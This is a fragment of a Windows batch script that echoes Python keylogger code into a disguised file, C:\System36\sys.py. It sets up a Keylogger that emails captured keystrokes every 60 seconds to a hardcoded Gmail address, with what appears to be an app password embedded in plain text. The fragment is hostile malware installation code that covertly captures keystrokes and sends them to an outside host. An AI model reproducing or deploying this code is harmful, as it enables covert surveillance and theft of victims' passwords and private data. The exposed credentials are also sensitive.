...
echo: >>C:\System36\sys.py
echo:            send_mail2("deja86931@gmail.com","kajsmgpzfbiftbqu",results) >>C:\System36\sys.py
...
echo: >>C:\System36\sys.py
echo:my_keylogger=Keylogger(60, "deja86931@gmail.com", "kajsmgpzfbiftbqu") >>C:\System36\sys.py
echo: >>C:\System36\sys.py
